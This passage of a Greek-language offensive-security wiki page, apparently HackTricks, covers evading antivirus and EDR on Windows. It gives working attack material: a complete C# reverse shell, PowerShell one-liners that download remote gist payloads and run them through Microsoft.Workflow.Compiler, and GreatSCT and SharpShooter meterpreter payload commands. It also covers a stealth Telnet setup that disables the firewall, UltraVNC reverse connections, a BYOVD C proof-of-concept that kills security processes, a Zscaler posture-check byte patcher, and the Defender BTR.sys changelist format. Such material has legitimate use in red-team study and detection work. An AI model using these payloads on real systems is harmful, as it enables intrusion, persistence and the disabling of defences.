Η συνιστώμενη διαδικασία build είναι μέσω του Docker environment του project, καθώς περιλαμβάνει το .NET 10 SDK, το NativeAOT-LLVM workload, το WASI SDK 24.0, τον linker και τις εξαρτήσεις υπογραφής. Ένα `.csproj` εντοπίζεται αυτόματα· το build με μία εντολή εκτελεί τη μεταφορά, τις διορθώσεις συμβατότητας, τη μεταγλώττιση WASM, τη δημιουργία PE και την υπογραφή.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Για αντιμετώπιση προβλημάτων ή έλεγχο του παραγόμενου κώδικα, χωρίστε τη διαδικασία στα `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` και, τέλος, στο `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. Το build image χρησιμοποιεί επίσης ένα wrapper `wasm-component-ld` για να αποφύγει την κωδικοποίηση component του WASI Preview 2 και να παράγει το απλό module που αναμένει το ενσωματωμένο runtime.<sup>[[44]](#references)[[45]](#references)</sup>

### Γεφύρωση wasm32 C# με x64 Win32

Δεν πρόκειται για διαφανή επαναμεταγλώττιση. Το NativeAOT-WASI δεν υποστηρίζει ή τροποποιεί δυνατότητες του BCL που προσανατολίζονται στα Windows, ενώ ένας wasm32 guest συνήθως δεσμεύει θέσεις δεικτών τεσσάρων byte, την ώρα που τα x64 APIs μπορούν να επιστρέψουν δείκτες οκτώ byte. Το WasmForge αντιμετωπίζει και τα δύο προβλήματα με τα ακόλουθα παραγόμενα επίπεδα:<sup>[[44]](#references)</sup>

1. Ένα source patcher διορθώνει σημασιολογικές διαφορές ειδικές για το AOT και ανακατευθύνει μη υποστηριζόμενες κλήσεις registry, pipes, WMI, identity, directory-service, file-version, LSA και παρόμοιες κλήσεις σε helpers `Wf*`.
2. Ένας σαρωτής P/Invoke παράγει αντιστοιχίσεις NativeAOT `DirectPInvoke`, ώστε οι κλήσεις `[DllImport]` να συνδέονται με συνδεδεμένα σύμβολα C bridge αντί να φορτώνουν δυναμικά την καθορισμένη DLL μέσα στον guest.
3. Οι δείκτες που προορίζονται για τον host χρησιμοποιούν `ulong` στη C# και `uint64_t` στη C. Ένας γενικός dispatcher προωθεί την κλήση στον Win32 handler του host· ένα `out8_mask` επισημαίνει τις πραγματικές θέσεις εξόδου οκτώ byte, των οποίων τα υψηλότερα μισά πρέπει να διατηρηθούν. Για τις μη επισημασμένες εξόδους σε μορφή wasm32 χρησιμοποιείται προστασία snapshot/restore, ώστε μια εγγραφή x64 να μην αλλοιώσει τα γειτονικά τέσσερα byte.
4. Εξειδικευμένα host bridges χειρίζονται λειτουργίες που δεν ταιριάζουν στη γενική αποστολή syscall, όπως πρόσβαση στην cache ticket του LSA, λειτουργίες Kerberos/BCrypt με δομημένα αποτελέσματα, κίνηση TCP KDC και ερωτήματα LDAP.

Για παράδειγμα, ένα wrapper για το `version.dll!VerQueryValueW` περνά τέσσερις διευθύνσεις host και ορίζει τα bits 2 και 3 (`0xC`), επειδή ο δείκτης τιμής και το μήκος είναι θέσεις εξόδου οκτώ byte. Το ίδιο το wrapper παραμένει γενικό και προωθεί το όνομα της DLL, το όνομα του export, τα ορίσματα και τη μάσκα στο `wf_call_v2`· ο host εκτελεί τη μετάφραση δεικτών και καλεί το native API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Περιορισμοί και σημεία αλλαγής στην ανίχνευση

Κώδικας με έντονη χρήση reflection, δυναμική φόρτωση assemblies, αυθαίρετα native callbacks και σύνθετες δομές x64 που επιστρέφονται στη μνήμη WASM ενδέχεται να εξακολουθούν να απαιτούν patches ανά εργαλείο ή να αποτυγχάνουν εντελώς. Τα γενικά sockets του WASI Preview 2 μπορεί επίσης να καταλήγουν σε no-op stubs, γι' αυτό τα υποστηριζόμενα εργαλεία χρησιμοποιούν host shims ειδικά για κάθε πρωτόκολλο. Επαληθεύετε κάθε εντολή με μια native έκδοση αντί να θεωρείτε δεδομένη την ισοδυναμία λειτουργιών.<sup>[[44]](#references)[[45]](#references)</sup>

Η τεχνική μετατοπίζει την τηλεμετρία, αντί να καθιστά το payload αόρατο. Η ανίχνευση μπορεί να εστιάσει σε ένα PE που περιέχει ή υλοποιεί ένα WASM module, σε συμπεριφορά runtime παρόμοια με του Wazero, σε ασυνήθιστη εκχώρηση και αντιγραφή μνήμης host/guest, σε γενική άμεση αποστολή Win32 κλήσεων, σε ανωμαλίες υπογραφής και πόρων PE, καθώς και στις κλήσεις API και την κίνηση δικτύου που ακολουθούν. Επομένως, η απουσία συμβάντων CLR-load, AMSI ή .NET ETW δεν πρέπει να θεωρείται ένδειξη ότι μια διεργασία είναι ακίνδυνη.<sup>[[44]](#references)</sup>

## Χρήση άλλων γλωσσών προγραμματισμού

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελεστεί κακόβουλος κώδικας με άλλες γλώσσες, παρέχοντας στο παραβιασμένο μηχάνημα πρόσβαση **στο περιβάλλον interpreter που είναι εγκατεστημένο στο SMB share που ελέγχει ο Attacker**.

Επιτρέποντας την πρόσβαση στα Interpreter Binaries και στο περιβάλλον του SMB share, μπορείτε να **εκτελέσετε αυθαίρετο κώδικα σε αυτές τις γλώσσες μέσα στη μνήμη** του παραβιασμένου μηχανήματος.

Το repo αναφέρει: το Defender εξακολουθεί να σαρώνει τα scripts, αλλά χρησιμοποιώντας Go, Java, PHP κ.λπ. έχουμε **περισσότερη ευελιξία στην παράκαμψη static signatures**. Οι δοκιμές με τυχαία, μη obfuscated reverse shell scripts σε αυτές τις γλώσσες είχαν επιτυχή αποτελέσματα.

## Επαναφιλοξενία WebAssembly για αποφυγή static analysis

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Το Token stomping χειραγωγεί το access token ενός προϊόντος ασφάλειας, όπως ενός EDR ή AV. Η μείωση των privileges του token μπορεί να αφήσει τη διεργασία σε εκτέλεση, ενώ την εμποδίζει να πραγματοποιεί προνομιακές ενέργειες επιθεώρησης ή αποκατάστασης.

Για να το αποτρέψουν, τα Windows θα μπορούσαν να **εμποδίζουν εξωτερικές διεργασίες** από το να αποκτούν handles στα tokens των διεργασιών ασφάλειας.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Χρήση έμπιστου λογισμικού

### Chrome Remote Desktop

Όπως περιγράφεται σε [**αυτή την ανάρτηση ιστολογίου**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο να εγκαταστήσετε το Chrome Remote Desktop στον υπολογιστή ενός θύματος και στη συνέχεια να το χρησιμοποιήσετε για να αποκτήσετε τον έλεγχο και να διατηρήσετε persistence:<sup>[[35]](#references)</sup>
1. Κατεβάστε το από το https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH" και έπειτα κάντε κλικ στο αρχείο MSI για Windows, ώστε να κατεβάσετε το αρχείο MSI.
2. Εκτελέστε σιωπηλά το πρόγραμμα εγκατάστασης στο θύμα (απαιτούνται δικαιώματα admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ στο next. Ο wizard θα σας ζητήσει να εξουσιοδοτήσετε· κάντε κλικ στο κουμπί Authorize για να συνεχίσετε.
4. Εκτελέστε την παρεχόμενη εντολή με τις απαιτούμενες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (η παράμετρος `--pin` ορίζει το PIN χωρίς χρήση του GUI).
 

## Προηγμένες τεχνικές αποφυγής

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Η αποφυγή είναι ένα πολύ σύνθετο θέμα. Μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές τηλεμετρίας σε ένα μόνο σύστημα, οπότε είναι σχεδόν αδύνατο να παραμείνετε εντελώς μη ανιχνεύσιμοι σε ώριμα περιβάλλοντα.

Κάθε περιβάλλον στο οποίο θα επιχειρήσετε να διεισδύσετε θα έχει τα δικά του δυνατά και αδύνατα σημεία.

Σας προτείνω θερμά να παρακολουθήσετε αυτή την ομιλία του [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε μια πρώτη εικόνα των πιο προηγμένων τεχνικών αποφυγής.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Αυτή είναι επίσης μια εξαιρετική ομιλία του [@mariuszbit](https://twitter.com/mariuszbit) για την εις βάθος αποφυγή.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Παλιές τεχνικές**

### **Έλεγχος των τμημάτων που το Defender εντοπίζει ως κακόβουλα**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), το οποίο **αφαιρεί τμήματα του binary** μέχρι να **εντοπίσει ποιο τμήμα θεωρεί κακόβουλο το Defender** και να σας το απομονώσει.\
Ένα άλλο εργαλείο που κάνει **το ίδιο είναι** το [**avred**](https://github.com/dobin/avred), το οποίο προσφέρει τη λειτουργία μέσω web στη διεύθυνση [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows περιλάμβαναν έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) εκτελώντας:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Κάντε το να **ξεκινά** όταν εκκινείται το σύστημα και **εκτελέστε** το τώρα:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Αλλάξτε τη θύρα telnet** (stealth) και απενεργοποιήστε το firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τις λήψεις bin, όχι το setup)

**ΣΤΟ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μεταφέρετε το binary _**winvnc.exe**_ και το **νέο** αρχείο _**UltraVNC.ini**_ που δημιουργήθηκε μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει στο** **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμο** να δεχτεί μια reverse **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Εκκινήστε τον daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε το stealth, δεν πρέπει να κάνετε ορισμένα πράγματα

- Μην εκκινήσετε το `winvnc` αν εκτελείται ήδη, αλλιώς θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην εκκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, αλλιώς θα ανοίξει το [παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, αλλιώς θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **ξεκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Το τρέχον Defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση της Python για παράδειγμα δημιουργίας injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Εξουδετέρωση AV/EDR από τον χώρο του kernel

Η Storm-2603 χρησιμοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες των endpoint πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για να εκτελέσει προνομιούχες λειτουργίες kernel, τις οποίες δεν μπορούν να αποκλείσουν ούτε οι υπηρεσίες AV με Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Υπογεγραμμένος driver**: Το αρχείο που παραδίδεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη κι όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το user land.
3. **IOCTLs που εκθέτει ο driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας μέσω PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου από τον δίσκο |
   | `0x990001D0` | Κατάργηση φόρτωσης του driver και αφαίρεση της υπηρεσίας |

   Ελάχιστο C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· ο κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να αλλοιώσει αντικείμενα του kernel, ανεξάρτητα από τις λειτουργίες PPL/PP, ELAM ή άλλες λειτουργίες ενίσχυσης της ασφάλειας.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και ενεργοποιήστε ειδοποίηση όταν ένας driver φορτώνεται από κατάλογο με δικαιώματα εγγραφής για όλους ή δεν περιλαμβάνεται στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε handles από user-mode προς προσαρμοσμένα device objects, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων κατάστασης συσκευής του Zscaler Client Connector μέσω επιδιόρθωσης δυαδικών αρχείων στον δίσκο

Το **Client Connector** του Zscaler εφαρμόζει τοπικά κανόνες κατάστασης συσκευής και βασίζεται στο Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα στοιχεία. Δύο αδύναμες επιλογές σχεδιασμού καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση της κατάστασης συσκευής γίνεται **εξ ολοκλήρου στην πλευρά του client** (στέλνεται μια boolean τιμή στον server).
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο που συνδέεται είναι **υπογεγραμμένο από την Zscaler** (μέσω `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με την **επιδιόρθωση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Δυαδικό αρχείο | Αρχική λογική που επιδιορθώνεται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, οπότε κάθε έλεγχος θεωρείται συμμορφούμενος |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | Γίνεται NOP-ed ⇒ οποιαδήποτε διεργασία (ακόμα και χωρίς υπογραφή) μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας του tunnel | Παρακάμπτονται με short-circuit |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι posture εμφανίζονται **πράσινοι/συμμορφωμένοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίγουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζουν οι πολιτικές Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς μπορούν να παρακαμφθούν αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά από την πλευρά του client και απλοί έλεγχοι υπογραφών με λίγες τροποποιήσεις byte.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Το πρόγραμμα οδήγησης **Boot-Time Removal** του Defender αποτελεί χρήσιμο αντίθετο παράδειγμα του κλασικού BYOVD. Το `BTR.sys` είναι ένα νόμιμο, υπογεγραμμένο από τη Microsoft στοιχείο αποκατάστασης, χωρίς bug καταστροφής μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ένας χειριστής μπορεί, αντί γι’ αυτό, να πλαστογραφήσει την ιδιωτική του συναλλαγή αποκατάστασης και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/μητρώου σε Ring-0. Αυτό είναι ένα **primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι αρχική πρόσβαση ή κλιμάκωση προνομίων**, και το πρόγραμμα οδήγησης μπορεί να εξαχθεί από τον πόρο `BOOTTIMETOOL` του ίδιου του `MpEngine.dll` του στόχου, αντί να εισαχθεί ένα ευδιάκριτο πρόγραμμα οδήγησης τρίτου μέρους.<sup>[[36]](#references)</sup>

### Προετοιμασία του one-shot προγράμματος οδήγησης

Κανονικά, το Defender αποθηκεύει τον πόρο ως αρχείο `[a-z]{8}.sys` με τυχαίο όνομα και καταχωρίζει μια υπηρεσία πυρήνα με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει τα σχόλια και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε το πρόγραμμα οδήγησης να αποφορτωθεί αντί να παραμείνει φορτωμένο. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Τα builds που αναλύθηκαν επαναχρησιμοποιούν ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει global header 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και transaction ID που προκύπτει από το payload), ακολουθούμενο από ένα UTF-16 feedback path με null terminator και οποιονδήποτε αριθμό items. Κάθε item έχει header 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και δεδομένα ειδικά για την ενέργεια, τα οποία τελειώνουν με **ακριβώς τέσσερα NUL bytes**. Κάθε περιοχή header/data ελέγχεται ανεξάρτητα με CRC-32 polynomial `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC επαναφέρεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action IDs εκθέτουν αυτά τα kernel primitives.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα item | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, ακόμη και αν είναι κλειδωμένο |
| 2 | `[UTF-16 path]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένο path που επιλέγει ο εισβολέας· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή κλειδιού registry |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή τιμής registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής registry και δημιουργία διαδρομών κλειδιών που λείπουν |

